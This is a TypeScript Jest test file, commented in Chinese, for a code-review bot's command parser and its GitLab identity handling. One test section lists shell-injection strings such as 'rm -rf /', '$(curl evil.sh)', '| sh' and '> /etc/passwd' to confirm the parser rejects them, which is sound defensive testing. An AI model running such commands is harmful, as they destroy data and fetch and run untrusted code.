/**
 * command-mention-identity.test.ts — §9.1 共用解析和身份（CMD-001/002/004/005/006）
 *
 * 这一节的四条要求落在两个地方：mention 怎么被认出来（parser），以及发言者是谁
 * （ExecutionContext 的 actor）。两个平台共用同一套 parser 与 registry，因此这里
 * 的断言按「规则」组织而不是按平台组织，只有确实存在平台差异的地方才分开写。
 */
import {describe, expect, test} from '@jest/globals'
import {BOT_MENTIONS} from '../src/constants'
import {DEFAULT_BOT_MENTIONS, parse, resolveBotMentions} from '../src/commands/parser'
import {
  createGitLabExecutionContext,
  isGitLabBotUsername
} from '../src/platform/gitlab-execution-context'

const registeredCommands = new Set(['help', 'review', 'full review', 'summary'])
const opts = (botMentions?: string[]): any => ({registeredCommands, botMentions})

describe('CMD-001: 保留 @ai-reviewer 和 @codesentinel 文本别名', () => {
  test('两个别名都在默认列表里（不因双平台改造被删）', () => {
    expect(DEFAULT_BOT_MENTIONS).toEqual(expect.arrayContaining(['@ai-reviewer', '@codesentinel']))
    expect(BOT_MENTIONS).toEqual(['@ai-reviewer', '@codesentinel'])
  })

  test.each(['@ai-reviewer help', '@codesentinel help'])('%s → 解析出 help', body => {
    const r: any = parse(body, opts())
    expect(r.kind).toBe('command')
    expect(r.command.name).toBe('help')
  })

  test.each(['@AI-Reviewer help', '@CODESENTINEL help', '@Ai-ReViEwEr help'])(
    '%s → 大小写不敏感',
    body => {
      const r: any = parse(body, opts())
      expect(r.kind).toBe('command')
      expect(r.command.name).toBe('help')
    }
  )
})

describe('CMD-002: GitLab 可用真实 PAT 账号 mention，也可用纯文本前缀', () => {
  test('未配置 botLogin → 退化为纯文本别名', () => {
    expect(resolveBotMentions('')).toEqual(DEFAULT_BOT_MENTIONS)
    expect(resolveBotMentions(undefined)).toEqual(DEFAULT_BOT_MENTIONS)
  })

  test('配置了 PAT 用户名 → 真实账号 mention 也能触发命令', () => {
    const mentions = resolveBotMentions('my-reviewer-pat')
    expect(mentions).toContain('@my-reviewer-pat')

    const r: any = parse('@my-reviewer-pat review', opts(mentions))
    expect(r.kind).toBe('command')
    expect(r.command.name).toBe('review')
  })

  test('配置真实账号后，文本别名仍然有效（两条路都通）', () => {
    const mentions = resolveBotMentions('my-reviewer-pat')
    const r: any = parse('@ai-reviewer review', opts(mentions))
    expect(r.kind).toBe('command')
  })

  test.each(['@my-reviewer-pat', 'my-reviewer-pat', '  @My-Reviewer-PAT  '])(
    '配置值写法 %s 都归一化到同一个 mention',
    configured => {
      expect(resolveBotMentions(configured)).toContain('@my-reviewer-pat')
    }
  )

  test('配置值恰好等于内置别名 → 不产生重复项', () => {
    expect(resolveBotMentions('ai-reviewer')).toEqual(DEFAULT_BOT_MENTIONS)
  })

  test('未配置时不会凭空产生 "@" 这种空 mention（否则任何 @ 都会触发）', () => {
    for (const m of resolveBotMentions('   ')) {
      expect(m.length).toBeGreaterThan(1)
    }
  })
})

describe('CMD-004: mention 必须具有合法文本边界', () => {
  // 迁移前只检查了 mention **前面**的字符，于是 `@ai-reviewerX help` 命中
  // `@ai-reviewer` 并把 `X help` 当成命令体——等于替另一个用户执行命令。
  test.each([
    ['@ai-reviewerX help', '后接字母'],
    ['@ai-reviewer2 help', '后接数字'],
    ['@ai-reviewer-bot help', '后接连字符（另一个账号）'],
    ['@ai-reviewer_bot help', '后接下划线'],
    ['@ai-reviewer.bot help', '后接点号 + 标识符（GitLab 用户名可含点）']
  ])('%s → 不触发（%s）', body => {
    expect(parse(body, opts()).kind).toBe('none')
  })

  test.each([
    ['foo@ai-reviewer help', '前接字母'],
    ['a@ai-reviewer.com', '邮箱地址']
  ])('%s → 不触发（%s）', body => {
    expect(parse(body, opts()).kind).toBe('none')
  })

  // 首次出现边界不合法时，早先直接放弃整条评论（indexOf 只找第一处），
  // 真正的命令写在后面也收不到
  test.each([
    'foo@ai-reviewer bar\n@ai-reviewer help',
    '邮箱 a@ai-reviewer.com\n@ai-reviewer help',
    '参考 x@codesentinel.io\n@codesentinel help'
  ])('前面有非法出现，后面的合法命令仍要识别：%s', body => {
    const r: any = parse(body, opts())
    expect(r.kind).toBe('command')
    expect(r.command.name).toBe('help')
  })

  test.each([
    ['@ai-reviewer help', '行首'],
    ['请 @ai-reviewer help', '空格前导'],
    ['@ai-reviewer, help', '逗号分隔'],
    ['@ai-reviewer：help', '中文冒号分隔'],
    ['@ai-reviewer\nhelp 之类', '换行']
  ])('%s → 合法边界（%s）', body => {
    expect(parse(body, opts()).kind).not.toBe('none')
  })
})

describe('CMD-005: 未知命令返回帮助，不执行任意文本或 shell', () => {
  test('@bot + 未注册命令 → 命中 UNKNOWN_COMMAND，而不是执行', () => {
    const r: any = parse('@ai-reviewer deploy', opts())
    expect(r.kind).toBe('command')
    expect(r.error?.code).toBe('UNKNOWN_COMMAND')
  })

  test('@bot + 自然语言 → conversation（交给对话 fallback），不是命令', () => {
    expect(parse('@ai-reviewer 这段为什么这样写？', opts()).kind).toBe('conversation')
  })

  /**
   * 要保证的是「绝不产生一条可执行的命令」，而不是某个特定的错误码。
   * 带 shell 元字符的输入有两种合法归宿：命中命令但参数非法（INVALID_ARGS），
   * 或整体不匹配任何命令而落到对话 fallback——两者都不会执行任何东西。
   */
  test.each([
    '@ai-reviewer help; rm -rf /',
    '@ai-reviewer help `whoami`',
    '@ai-reviewer help $(id)',
    '@ai-reviewer help && curl evil.sh',
    '@ai-reviewer help | sh',
    '@ai-reviewer help > /etc/passwd',
    '@ai-reviewer review $(curl evil.sh)',
    "@ai-reviewer review '; drop table"
  ])('shell 元字符绝不产生可执行命令：%s', body => {
    const r: any = parse(body, opts())
    const executable = r.kind === 'command' && r.error == null
    expect(`${body} → executable=${executable}`).toBe(`${body} → executable=false`)
  })

  test('对照组：干净参数确实能解析成可执行命令（证明上一条不是恒真）', () => {
    const r: any = parse('@ai-reviewer full review', opts())
    expect(r.kind).toBe('command')
    expect(r.error).toBeUndefined()
    expect(r.command.name).toBe('full review')
  })

  test('未 @bot 的文本一律不触发（真人之间的普通讨论）', () => {
    expect(parse('help', opts()).kind).toBe('none')
    expect(parse('rm -rf /', opts()).kind).toBe('none')
  })
})

describe('CMD-006: system/bot/self note 不进入权限和模型流程', () => {
  describe('GitLab 侧的 bot 判定只认权威命名', () => {
    test.each([
      'project_123_bot',
      'project_123_bot_a1b2c3',
      'group_45_bot',
      'group_45_bot_xyz',
      'support-bot',
      'alert-bot',
      'ghost'
    ])('%s → 判为 bot', name => {
      expect(isGitLabBotUsername(name)).toBe(true)
    })

    test.each([
      ['alice', '普通用户'],
      ['talk-bot', '用户名恰好以 bot 结尾的真人'],
      ['robot-lover', '含 bot 字样'],
      ['project_bot', '缺少项目 ID，不符合 GitLab 命名'],
      ['projectx_12_bot', '前缀不对'],
      ['', '空']
    ])('%s → 不判为 bot（%s）', name => {
      expect(isGitLabBotUsername(name)).toBe(false)
    })

    test('大小写不敏感', () => {
      expect(isGitLabBotUsername('Project_123_Bot')).toBe(true)
      expect(isGitLabBotUsername('SUPPORT-BOT')).toBe(true)
    })
  })

  /**
   * 上面测的是纯函数。注入回退验证显示：把 makeGitLabActor 里的判定改回
   * `isBot: false`，那些用例**一条都不红**——判定写了但没接进 ExecutionContext
   * 也照样全绿。所以必须单独钉住接线。
   */
  describe('判定确实接进了 ExecutionContext（不只是纯函数存在）', () => {
    const notePayload = (username: string): any => ({
      object_kind: 'note',
      project: {id: 77, path_with_namespace: 'group/demo'},
      project_id: 77,
      user: {username},
      merge_request: {iid: 42, diff_head_sha: 'a'.repeat(40)},
      object_attributes: {
        id: 9001,
        action: 'create',
        note: '@ai-reviewer help',
        noteable_type: 'MergeRequest',
        system: false
      }
    })

    test('access token 账号发的 note → execCtx.actor.isBot 为 true', () => {
      const ctx = createGitLabExecutionContext(notePayload('project_123_bot_abc'))
      expect(ctx.actor).toEqual({login: 'project_123_bot_abc', isBot: true})
    })

    test('真人发的 note → execCtx.actor.isBot 为 false', () => {
      const ctx = createGitLabExecutionContext(notePayload('alice'))
      expect(ctx.actor).toEqual({login: 'alice', isBot: false})
    })

    test('MR 事件同样带上判定结果', () => {
      const ctx = createGitLabExecutionContext({
        object_kind: 'merge_request',
        project: {id: 77, path_with_namespace: 'group/demo'},
        user: {username: 'group_45_bot'},
        object_attributes: {
          iid: 42,
          action: 'open',
          source_project_id: 77,
          target_project_id: 77,
          last_commit: {id: 'a'.repeat(40)}
        }
      })
      expect(ctx.actor.isBot).toBe(true)
    })
  })

  test('刻意不匹配泛化的 -bot 后缀（否则会把真人永久挡在命令之外）', () => {
    // 反向漏判的危害小得多：reviewer 自己的反馈循环由 EVENT-018 的
    // isSelfNote 过滤，见 gitlab-trigger.ts
    expect(isGitLabBotUsername('deploy-bot')).toBe(false)
    expect(isGitLabBotUsername('some_bot')).toBe(false)
  })
})
